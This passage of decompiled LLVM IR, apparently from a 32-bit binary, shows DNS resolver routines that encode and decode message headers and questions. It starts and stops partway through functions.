  uselistorder i32 %v0_80567d264, { 2, 6, 5, 1, 4, 3, 0 }
  uselistorder i32 %v2_80567ad, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_805684d18, { 1, 0 }
  uselistorder i32 %v1_80567a2, { 1, 0 }
  uselistorder i32 %v0_80567a2, { 1, 0, 2 }
  uselistorder i32 %v5_80567aa, { 1, 2, 0 }
  uselistorder i32 %v1_8056785, { 0, 2, 1 }
  uselistorder i32 %v0_80567759, { 1, 2, 0, 3 }
  uselistorder i32 %v0_805678013, { 1, 2, 0, 3 }
  uselistorder i1 %v10_8056770, { 1, 0 }
  uselistorder i32 %v0_805679b66, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805679067, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_805678569, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_805673d70, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_80566dc, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-124, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 5, 4, 2, 6, 3, 7 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 14, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 97, { 5, 6, 4, 0, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @sprintf, { 2, 1, 0 }
  uselistorder [3 x i8]* @global_var_8061791.803, { 1, 0 }
  uselistorder i8 58, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32 65535, { 0, 1, 3, 2 }
  uselistorder i32 64, { 8, 3, 10, 7, 9, 6, 2, 4, 0, 5, 1 }
  uselistorder i32* @esp, { 0, 1, 147, 7, 148, 149, 150, 151, 152, 153, 8, 262, 263, 264, 265, 266, 267, 268, 10, 269, 270, 271, 272, 273, 16, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 12, 284, 285, 286, 13, 287, 9, 288, 289, 290, 291, 292, 293, 14, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 11, 307, 308, 309, 310, 311, 312, 15, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 156, 17, 157, 2, 3, 335, 4, 5, 6, 18, 158, 159, 160, 161, 19, 162, 163, 164, 165, 22, 166, 167, 168, 23, 169, 24, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 21, 183, 25, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 20, 196, 197, 198, 199, 154, 155, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 80, 79, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 102, 101, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 260, 261, 334 }
  uselistorder i32 15, { 1, 5, 9, 8, 2, 7, 6, 3, 4, 0 }
  uselistorder i32 60, { 5, 6, 7, 8, 1, 9, 4, 3, 2, 0 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 12, 11, 14, 13 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 8, 9, 10, 5, 18, 16, 15, 17, 6, 1, 2, 3, 4, 7, 11, 12, 13, 14 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_80568a0, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_805689e, { 1, 0 }
  uselistorder label %dec_label_pc_805685e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056843, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80567da, { 1, 0 }
  uselistorder label %dec_label_pc_80567d2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80567b8, { 1, 0 }
  uselistorder label %dec_label_pc_80567ad, { 1, 0 }
  uselistorder label %dec_label_pc_805679d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056799, { 1, 0 }
  uselistorder label %dec_label_pc_8056785, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8056782, { 1, 0 }
  uselistorder label %dec_label_pc_8056758, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80568b0 = load i32, i32* @ebx, align 4
  store i32 %v0_80568b0, i32* %stack_var_-8, align 4
  store i32 %tmp8, i32* %ebx.global-to-local, align 4
  %v4_80568ba = ptrtoint i8* %tmp to i32
  store i32 %v4_80568ba, i32* %esi.global-to-local, align 4
  %v7_80568be = icmp sgt i32 %tmp9, 11
  br i1 %v7_80568be, label %dec_label_pc_80568c4, label %dec_label_pc_8056958

dec_label_pc_80568c4:                             ; preds = %entry
  %v1_80568c4 = add i32 %tmp8, 1
  %v2_80568c4 = inttoptr i32 %v1_80568c4 to i8*
  %v3_80568c4 = load i8, i8* %v2_80568c4, align 1
  store i8 %v3_80568c4, i8* %tmp, align 1
  %v0_80568ca = load i32, i32* %ebx.global-to-local, align 4
  %v1_80568ca = inttoptr i32 %v0_80568ca to i32*
  %v2_80568ca = load i32, i32* %v1_80568ca, align 4
  %v1_80568cc = trunc i32 %v2_80568ca to i8
  %v2_80568cc = load i32, i32* %esi.global-to-local, align 4
  %v3_80568cc = add i32 %v2_80568cc, 1
  %v4_80568cc = inttoptr i32 %v3_80568cc to i8*
  store i8 %v1_80568cc, i8* %v4_80568cc, align 1
  store i32 4, i32* %edx.global-to-local, align 4
  %v0_80568f1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80568f1 = add i32 %v0_80568f1, 8
  %v2_80568f1 = inttoptr i32 %v1_80568f1 to i32*
  %v3_80568f1 = load i32, i32* %v2_80568f1, align 4
  %v1_80568f4 = mul i32 %v3_80568f1, 8
  %v2_80568f7 = and i32 %v1_80568f4, 120
  %v2_80568fa = or i32 %v2_80568f7, 4
  store i32 %v2_80568fa, i32* %edx.global-to-local, align 4
  %v1_80568fc = add i32 %v0_80568f1, 20
  %v2_80568fc = inttoptr i32 %v1_80568fc to i32*
  %v3_80568fc = load i32, i32* %v2_80568fc, align 4
  %v4_80568fc = icmp eq i32 %v3_80568fc, 0
  %v1_8056900 = icmp eq i1 %v4_80568fc, false
  %v2_8056900 = zext i1 %v1_8056900 to i32
  %v2_8056903 = or i32 %v2_8056900, %v2_80568fa
  store i32 %v2_8056903, i32* %edx.global-to-local, align 4
  %v2_8056905 = or i32 %v2_8056903, 130
  %v3_8056905 = trunc i32 %v2_8056905 to i8
  store i32 %v2_8056905, i32* @ecx, align 4
  %v2_8056907 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056907 = add i32 %v2_8056907, 2
  %v4_8056907 = inttoptr i32 %v3_8056907 to i8*
  store i8 %v3_8056905, i8* %v4_8056907, align 1
  %v0_805690a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805690e = add i32 %v0_805690a, 28
  %v2_805690e = inttoptr i32 %v1_805690e to i8*
  %v3_805690e = load i8, i8* %v2_805690e, align 1
  %v5_805690e = load i32, i32* %edx.global-to-local, align 4
  %v2_8056917 = urem i8 %v3_805690e, 16
  %v7_8056917 = zext i8 %v2_8056917 to i32
  %v9_8056917 = and i32 %v5_805690e, -256
  %v10_8056917 = or i32 %v9_8056917, %v7_8056917
  store i32 %v10_8056917, i32* %edx.global-to-local, align 4
  %v2_805691a = or i8 %v2_8056917, -128
  %v2_805691c = load i32, i32* %esi.global-to-local, align 4
  %v3_805691c = add i32 %v2_805691c, 3
  %v4_805691c = inttoptr i32 %v3_805691c to i8*
  store i8 %v2_805691a, i8* %v4_805691c, align 1
  %v0_805691f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805691f = add i32 %v0_805691f, 33
  %v2_805691f = inttoptr i32 %v1_805691f to i8*
  %v3_805691f = load i8, i8* %v2_805691f, align 1
  %v2_8056923 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056923 = add i32 %v2_8056923, 4
  %v4_8056923 = inttoptr i32 %v3_8056923 to i8*
  store i8 %v3_805691f, i8* %v4_8056923, align 1
  %v0_8056926 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056926 = add i32 %v0_8056926, 32
  %v2_8056926 = inttoptr i32 %v1_8056926 to i32*
  %v3_8056926 = load i32, i32* %v2_8056926, align 4
  %v1_8056929 = trunc i32 %v3_8056926 to i8
  %v2_8056929 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056929 = add i32 %v2_8056929, 5
  %v4_8056929 = inttoptr i32 %v3_8056929 to i8*
  store i8 %v1_8056929, i8* %v4_8056929, align 1
  %v0_805692c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805692c = add i32 %v0_805692c, 37
  %v2_805692c = inttoptr i32 %v1_805692c to i8*
  %v3_805692c = load i8, i8* %v2_805692c, align 1
  %v2_8056930 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056930 = add i32 %v2_8056930, 6
  %v4_8056930 = inttoptr i32 %v3_8056930 to i8*
  store i8 %v3_805692c, i8* %v4_8056930, align 1
  %v0_8056933 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056933 = add i32 %v0_8056933, 36
  %v2_8056933 = inttoptr i32 %v1_8056933 to i32*
  %v3_8056933 = load i32, i32* %v2_8056933, align 4
  %v1_8056936 = trunc i32 %v3_8056933 to i8
  %v2_8056936 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056936 = add i32 %v2_8056936, 7
  %v4_8056936 = inttoptr i32 %v3_8056936 to i8*
  store i8 %v1_8056936, i8* %v4_8056936, align 1
  %v0_8056939 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056939 = add i32 %v0_8056939, 41
  %v2_8056939 = inttoptr i32 %v1_8056939 to i8*
  %v3_8056939 = load i8, i8* %v2_8056939, align 1
  %v2_805693d = load i32, i32* %esi.global-to-local, align 4
  %v3_805693d = add i32 %v2_805693d, 8
  %v4_805693d = inttoptr i32 %v3_805693d to i8*
  store i8 %v3_8056939, i8* %v4_805693d, align 1
  %v0_8056940 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056940 = add i32 %v0_8056940, 40
  %v2_8056940 = inttoptr i32 %v1_8056940 to i32*
  %v3_8056940 = load i32, i32* %v2_8056940, align 4
  %v1_8056943 = trunc i32 %v3_8056940 to i8
  %v2_8056943 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056943 = add i32 %v2_8056943, 9
  %v4_8056943 = inttoptr i32 %v3_8056943 to i8*
  store i8 %v1_8056943, i8* %v4_8056943, align 1
  %v0_8056946 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056946 = add i32 %v0_8056946, 45
  %v2_8056946 = inttoptr i32 %v1_8056946 to i8*
  %v3_8056946 = load i8, i8* %v2_8056946, align 1
  %v2_805694a = load i32, i32* %esi.global-to-local, align 4
  %v3_805694a = add i32 %v2_805694a, 10
  %v4_805694a = inttoptr i32 %v3_805694a to i8*
  store i8 %v3_8056946, i8* %v4_805694a, align 1
  %v0_805694d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805694d = add i32 %v0_805694d, 44
  %v2_805694d = inttoptr i32 %v1_805694d to i32*
  %v3_805694d = load i32, i32* %v2_805694d, align 4
  %v1_8056950 = trunc i32 %v3_805694d to i8
  %v2_8056950 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056950 = add i32 %v2_8056950, 11
  %v4_8056950 = inttoptr i32 %v3_8056950 to i8*
  store i8 %v1_8056950, i8* %v4_8056950, align 1
  %v2_8056958.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8056958

dec_label_pc_8056958:                             ; preds = %entry, %dec_label_pc_80568c4
  %v2_8056958 = phi i32 [ %v0_80568b0, %entry ], [ %v2_8056958.pre, %dec_label_pc_80568c4 ]
  %v0_805695a = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_80568c4 ]
  store i32 %v2_8056958, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805695a

; uselistorder directives
  uselistorder i32 45, { 5, 2, 4, 1, 0, 3 }
  uselistorder i32 41, { 2, 1, 0 }
  uselistorder i32 37, { 4, 2, 1, 3, 0 }
  uselistorder i32 33, { 5, 3, 4, 1, 2, 0 }
  uselistorder label %dec_label_pc_8056958, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  %v0_805695c = load i32, i32* @ebx, align 4
  store i32 %v0_805695c, i32* %stack_var_-4, align 4
  %v4_805695d = ptrtoint i8* %tmp2 to i32
  store i32 %v4_805695d, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_8056965 = load i8, i8* %tmp2, align 1
  %v3_8056965 = zext i8 %v2_8056965 to i32
  %v1_8056968 = add i32 %v4_805695d, 1
  %v2_8056968 = inttoptr i32 %v1_8056968 to i8*
  %v3_8056968 = load i8, i8* %v2_8056968, align 1
  %v4_8056968 = zext i8 %v3_8056968 to i32
  %v2_805696c = mul nuw nsw i32 %v3_8056965, 256
  %v2_805696f = or i32 %v4_8056968, %v2_805696c
  %v2_8056971 = inttoptr i32 %tmp to i32*
  store i32 %v2_805696f, i32* %v2_8056971, align 4
  %v0_8056973 = load i32, i32* @ecx, align 4
  %v1_8056973 = add i32 %v0_8056973, 2
  %v2_8056973 = inttoptr i32 %v1_8056973 to i8*
  %v3_8056973 = load i8, i8* %v2_8056973, align 1
  %tmp6 = icmp slt i8 %v3_8056973, 0
  %v2_8056977 = zext i1 %tmp6 to i32
  %v1_805697a = load i32, i32* %ebx.global-to-local, align 4
  %v2_805697a = add i32 %v1_805697a, 4
  %v3_805697a = inttoptr i32 %v2_805697a to i32*
  store i32 %v2_8056977, i32* %v3_805697a, align 4
  %v0_805697d = load i32, i32* @ecx, align 4
  %v1_805697d = add i32 %v0_805697d, 2
  %v2_805697d = inttoptr i32 %v1_805697d to i8*
  %v3_805697d = load i8, i8* %v2_805697d, align 1
  %v3_8056980 = udiv i8 %v3_805697d, 8
  %tmp7 = urem i8 %v3_8056980, 16
  %v1_8056983 = zext i8 %tmp7 to i32
  %v1_8056986 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056986 = add i32 %v1_8056986, 8
  %v3_8056986 = inttoptr i32 %v2_8056986 to i32*
  store i32 %v1_8056983, i32* %v3_8056986, align 4
  %v0_8056989 = load i32, i32* @ecx, align 4
  %v1_8056989 = add i32 %v0_8056989, 2
  %v2_8056989 = inttoptr i32 %v1_8056989 to i8*
  %v3_8056989 = load i8, i8* %v2_8056989, align 1
  %div = udiv i8 %v3_8056989, 4
  %tmp8 = urem i8 %div, 2
  %v1_8056990 = zext i8 %tmp8 to i32
  %v1_8056993 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056993 = add i32 %v1_8056993, 12
  %v3_8056993 = inttoptr i32 %v2_8056993 to i32*
  store i32 %v1_8056990, i32* %v3_8056993, align 4
  %v0_8056996 = load i32, i32* @ecx, align 4
  %v1_8056996 = add i32 %v0_8056996, 2
  %v2_8056996 = inttoptr i32 %v1_8056996 to i8*
  %v3_8056996 = load i8, i8* %v2_8056996, align 1
  %div5 = udiv i8 %v3_8056996, 2
  %tmp9 = urem i8 %div5, 2
  %v1_805699c = zext i8 %tmp9 to i32
  %v1_805699f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805699f = add i32 %v1_805699f, 16
  %v3_805699f = inttoptr i32 %v2_805699f to i32*
  store i32 %v1_805699c, i32* %v3_805699f, align 4
  %v0_80569a2 = load i32, i32* @ecx, align 4
  %v1_80569a2 = add i32 %v0_80569a2, 2
  %v2_80569a2 = inttoptr i32 %v1_80569a2 to i8*
  %v3_80569a2 = load i8, i8* %v2_80569a2, align 1
  %tmp10 = urem i8 %v3_80569a2, 2
  %v1_80569a6 = zext i8 %tmp10 to i32
  %v1_80569a9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80569a9 = add i32 %v1_80569a9, 20
  %v3_80569a9 = inttoptr i32 %v2_80569a9 to i32*
  store i32 %v1_80569a6, i32* %v3_80569a9, align 4
  %v0_80569ac = load i32, i32* @ecx, align 4
  %v1_80569ac = add i32 %v0_80569ac, 3
  %v2_80569ac = inttoptr i32 %v1_80569ac to i8*
  %v3_80569ac = load i8, i8* %v2_80569ac, align 1
  %tmp11 = icmp slt i8 %v3_80569ac, 0
  %v2_80569b0 = zext i1 %tmp11 to i32
  %v1_80569b3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80569b3 = add i32 %v1_80569b3, 24
  %v3_80569b3 = inttoptr i32 %v2_80569b3 to i32*
  store i32 %v2_80569b0, i32* %v3_80569b3, align 4
  %v0_80569b6 = load i32, i32* @ecx, align 4
  %v1_80569b6 = add i32 %v0_80569b6, 3
  %v2_80569b6 = inttoptr i32 %v1_80569b6 to i8*
  %v3_80569b6 = load i8, i8* %v2_80569b6, align 1
  %tmp12 = urem i8 %v3_80569b6, 16
  %v1_80569ba = zext i8 %tmp12 to i32
  %v1_80569bd = load i32, i32* %ebx.global-to-local, align 4
  %v2_80569bd = add i32 %v1_80569bd, 28
  %v3_80569bd = inttoptr i32 %v2_80569bd to i32*
  store i32 %v1_80569ba, i32* %v3_80569bd, align 4
  %v0_80569c0 = load i32, i32* @ecx, align 4
  %v1_80569c0 = add i32 %v0_80569c0, 4
  %v2_80569c0 = inttoptr i32 %v1_80569c0 to i8*
  %v3_80569c0 = load i8, i8* %v2_80569c0, align 1
  %v4_80569c0 = zext i8 %v3_80569c0 to i32
  %v1_80569c4 = add i32 %v0_80569c0, 5
  %v2_80569c4 = inttoptr i32 %v1_80569c4 to i8*
  %v3_80569c4 = load i8, i8* %v2_80569c4, align 1
  %v4_80569c4 = zext i8 %v3_80569c4 to i32
  %v2_80569c8 = mul nuw nsw i32 %v4_80569c0, 256
  %v2_80569cb = or i32 %v4_80569c4, %v2_80569c8
  %v1_80569cd = load i32, i32* %ebx.global-to-local, align 4
  %v2_80569cd = add i32 %v1_80569cd, 32
  %v3_80569cd = inttoptr i32 %v2_80569cd to i32*
  store i32 %v2_80569cb, i32* %v3_80569cd, align 4
  %v0_80569d0 = load i32, i32* @ecx, align 4
  %v1_80569d0 = add i32 %v0_80569d0, 6
  %v2_80569d0 = inttoptr i32 %v1_80569d0 to i8*
  %v3_80569d0 = load i8, i8* %v2_80569d0, align 1
  %v4_80569d0 = zext i8 %v3_80569d0 to i32
  %v1_80569d4 = add i32 %v0_80569d0, 7
  %v2_80569d4 = inttoptr i32 %v1_80569d4 to i8*
  %v3_80569d4 = load i8, i8* %v2_80569d4, align 1
  %v4_80569d4 = zext i8 %v3_80569d4 to i32
  %v2_80569d8 = mul nuw nsw i32 %v4_80569d0, 256
  %v2_80569db = or i32 %v4_80569d4, %v2_80569d8
  %v1_80569dd = load i32, i32* %ebx.global-to-local, align 4
  %v2_80569dd = add i32 %v1_80569dd, 36
  %v3_80569dd = inttoptr i32 %v2_80569dd to i32*
  store i32 %v2_80569db, i32* %v3_80569dd, align 4
  %v0_80569e0 = load i32, i32* @ecx, align 4
  %v1_80569e0 = add i32 %v0_80569e0, 8
  %v2_80569e0 = inttoptr i32 %v1_80569e0 to i8*
  %v3_80569e0 = load i8, i8* %v2_80569e0, align 1
  %v4_80569e0 = zext i8 %v3_80569e0 to i32
  %v1_80569e4 = add i32 %v0_80569e0, 9
  %v2_80569e4 = inttoptr i32 %v1_80569e4 to i8*
  %v3_80569e4 = load i8, i8* %v2_80569e4, align 1
  %v4_80569e4 = zext i8 %v3_80569e4 to i32
  %v2_80569e8 = mul nuw nsw i32 %v4_80569e0, 256
  %v2_80569eb = or i32 %v4_80569e4, %v2_80569e8
  %v1_80569ed = load i32, i32* %ebx.global-to-local, align 4
  %v2_80569ed = add i32 %v1_80569ed, 40
  %v3_80569ed = inttoptr i32 %v2_80569ed to i32*
  store i32 %v2_80569eb, i32* %v3_80569ed, align 4
  %v0_80569f0 = load i32, i32* @ecx, align 4
  %v1_80569f0 = add i32 %v0_80569f0, 10
  %v2_80569f0 = inttoptr i32 %v1_80569f0 to i8*
  %v3_80569f0 = load i8, i8* %v2_80569f0, align 1
  %v4_80569f0 = zext i8 %v3_80569f0 to i32
  %v1_80569f4 = add i32 %v0_80569f0, 11
  %v2_80569f4 = inttoptr i32 %v1_80569f4 to i8*
  %v3_80569f4 = load i8, i8* %v2_80569f4, align 1
  %v4_80569f4 = zext i8 %v3_80569f4 to i32
  %v2_80569f8 = mul nuw nsw i32 %v4_80569f0, 256
  %v2_80569fb = or i32 %v4_80569f4, %v2_80569f8
  %v1_80569fd = load i32, i32* %ebx.global-to-local, align 4
  %v2_80569fd = add i32 %v1_80569fd, 44
  %v3_80569fd = inttoptr i32 %v2_80569fd to i32*
  store i32 %v2_80569fb, i32* %v3_80569fd, align 4
  %v2_8056a05 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8056a05, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 11, { 14, 15, 3, 4, 7, 8, 16, 5, 9, 10, 11, 12, 6, 13, 2, 1, 0 }
  uselistorder i32 40, { 9, 10, 3, 12, 13, 11, 1, 2, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 7, { 24, 25, 5, 11, 6, 0, 4, 12, 19, 20, 21, 22, 23, 7, 3, 1, 18, 8, 9, 10, 13, 14, 15, 16, 17, 2 }
  uselistorder i32 6, { 27, 28, 0, 1, 12, 24, 5, 22, 13, 14, 9, 30, 15, 25, 6, 7, 4, 8, 11, 10, 16, 17, 18, 3, 26, 19, 23, 20, 21, 29, 2 }
  uselistorder i32 28, { 35, 36, 18, 19, 37, 25, 49, 48, 41, 42, 0, 43, 44, 45, 46, 47, 4, 5, 6, 2, 26, 17, 20, 21, 38, 39, 27, 28, 29, 30, 31, 32, 3, 33, 50, 40, 22, 23, 24, 7, 8, 34, 13, 12, 10, 11, 14, 15, 9, 16, 1 }
  uselistorder i8 2, { 1, 2, 3, 4, 5, 16, 6, 0, 22, 19, 7, 8, 9, 10, 11, 12, 20, 21, 13, 17, 18, 14, 15 }
  uselistorder i8 4, { 0, 4, 5, 2, 3, 1 }
  uselistorder i8 16, { 0, 1, 2, 4, 5, 6, 7, 8, 3 }
  uselistorder i8 8, { 0, 8, 1, 7, 2, 3, 4, 5, 6 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_8056a08 = load i32, i32* @edi, align 4
  %v0_8056a09 = load i32, i32* @esi, align 4
  %v0_8056a0a = load i32, i32* @ebx, align 4
  store i32 %v0_8056a0a, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @ebx, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @esi, align 4
  %v0_8056a17 = load i32, i32* @eax, align 4
  %v1_8056a1a = inttoptr i32 %tmp to i32*
  %v2_8056a1a = load i32, i32* %v1_8056a1a, align 4
  %v7_8056a1c = inttoptr i32 %v2_8056a1a to i8*
  %v8_8056a1c = call i32 @__encode_dotted(i8* %v7_8056a1c, i32 %tmp2, i32 %tmp3, i32 %v0_8056a17, i32 %v0_8056a0a, i32 %v0_8056a09, i32 %v0_8056a08)
  %v2_8056a24 = icmp slt i32 %v8_8056a1c, 0
  store i32 %v8_8056a1c, i32* @ecx, align 4
  br i1 %v2_8056a24, label %dec_label_pc_8056a55, label %dec_label_pc_8056a2a

dec_label_pc_8056a2a:                             ; preds = %entry
  %v0_8056a2a = load i32, i32* @ebx, align 4
  %v2_8056a2a = sub i32 %v0_8056a2a, %v8_8056a1c
  %v1_8056a2c = add i32 %v2_8056a2a, -3
  %v6_8056a2c = sub i32 2, %v2_8056a2a
  %v7_8056a2c = and i32 %v6_8056a2c, %v2_8056a2a
  %v8_8056a2c = icmp slt i32 %v7_8056a2c, 0
  %v9_8056a2c = icmp eq i32 %v1_8056a2c, 0
  %v10_8056a2c = icmp slt i32 %v1_8056a2c, 0
  %v3_8056a2f = icmp eq i1 %v10_8056a2c, %v8_8056a2c
  %v4_8056a2f = icmp eq i1 %v9_8056a2c, false
  %v5_8056a2f = and i1 %v4_8056a2f, %v3_8056a2f
  br i1 %v5_8056a2f, label %dec_label_pc_8056a36, label %dec_label_pc_8056a31

dec_label_pc_8056a31:                             ; preds = %dec_label_pc_8056a2a
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_8056a55

dec_label_pc_8056a36:                             ; preds = %dec_label_pc_8056a2a
  %v0_8056a36 = load i32, i32* @edi, align 4
  %v2_8056a36 = add i32 %v0_8056a36, %v8_8056a1c
  store i32 %v2_8056a36, i32* @edx, align 4
  %v0_8056a39 = load i32, i32* @esi, align 4
  %v1_8056a39 = add i32 %v0_8056a39, 5
  %v2_8056a39 = inttoptr i32 %v1_8056a39 to i8*
  %v3_8056a39 = load i8, i8* %v2_8056a39, align 1
  %v1_8056a3d = add i32 %v8_8056a1c, 4
  store i32 %v1_8056a3d, i32* @ecx, align 4
  %v3_8056a40 = inttoptr i32 %v2_8056a36 to i8*
  store i8 %v3_8056a39, i8* %v3_8056a40, align 1
  %v0_8056a42 = load i32, i32* @esi, align 4
  %v1_8056a42 = add i32 %v0_8056a42, 4
  %v2_8056a42 = inttoptr i32 %v1_8056a42 to i32*
  %v3_8056a42 = load i32, i32* %v2_8056a42, align 4
  %v1_8056a45 = trunc i32 %v3_8056a42 to i8
  %v2_8056a45 = load i32, i32* @edx, align 4
  %v3_8056a45 = add i32 %v2_8056a45, 1
  %v4_8056a45 = inttoptr i32 %v3_8056a45 to i8*
  store i8 %v1_8056a45, i8* %v4_8056a45, align 1
  %v0_8056a48 = load i32, i32* @esi, align 4
  %v1_8056a48 = add i32 %v0_8056a48, 9
  %v2_8056a48 = inttoptr i32 %v1_8056a48 to i8*
  %v3_8056a48 = load i8, i8* %v2_8056a48, align 1
  %v2_8056a4c = load i32, i32* @edx, align 4
  %v3_8056a4c = add i32 %v2_8056a4c, 2
  %v4_8056a4c = inttoptr i32 %v3_8056a4c to i8*
  store i8 %v3_8056a48, i8* %v4_8056a4c, align 1
  %v0_8056a4f = load i32, i32* @esi, align 4
  %v1_8056a4f = add i32 %v0_8056a4f, 8
  %v2_8056a4f = inttoptr i32 %v1_8056a4f to i32*
  %v3_8056a4f = load i32, i32* %v2_8056a4f, align 4
  %v1_8056a52 = trunc i32 %v3_8056a4f to i8
  %v2_8056a52 = load i32, i32* @edx, align 4
  %v3_8056a52 = add i32 %v2_8056a52, 3
  %v4_8056a52 = inttoptr i32 %v3_8056a52 to i8*
  store i8 %v1_8056a52, i8* %v4_8056a52, align 1
  %v0_8056a56.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8056a55

dec_label_pc_8056a55:                             ; preds = %entry, %dec_label_pc_8056a31, %dec_label_pc_8056a36
  %v0_8056a56 = phi i32 [ %v8_8056a1c, %entry ], [ -1, %dec_label_pc_8056a31 ], [ %v0_8056a56.pre, %dec_label_pc_8056a36 ]
  %v2_8056a55 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8056a55, i32* @ebx, align 4
  store i32 %v0_8056a08, i32* @edi, align 4
  ret i32 %v0_8056a56

; uselistorder directives
  uselistorder i32 %v1_8056a2c, { 1, 0 }
  uselistorder i32 %v2_8056a2a, { 0, 2, 1 }
  uselistorder i32 %v8_8056a1c, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32 -3, { 3, 2, 1, 8, 4, 5, 6, 0, 7 }
  uselistorder label %dec_label_pc_8056a55, { 2, 1, 0 }
}

define i32 @__length_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v2_8056a67 = call i32 @__length_dotted(i32 %tmp, i32 %tmp1)
  %v2_8056a6c = icmp slt i32 %v2_8056a67, 0
  %v1_8056a6e = add i32 %v2_8056a67, 4
  %v1_8056a71 = icmp eq i1 %v2_8056a6c, false
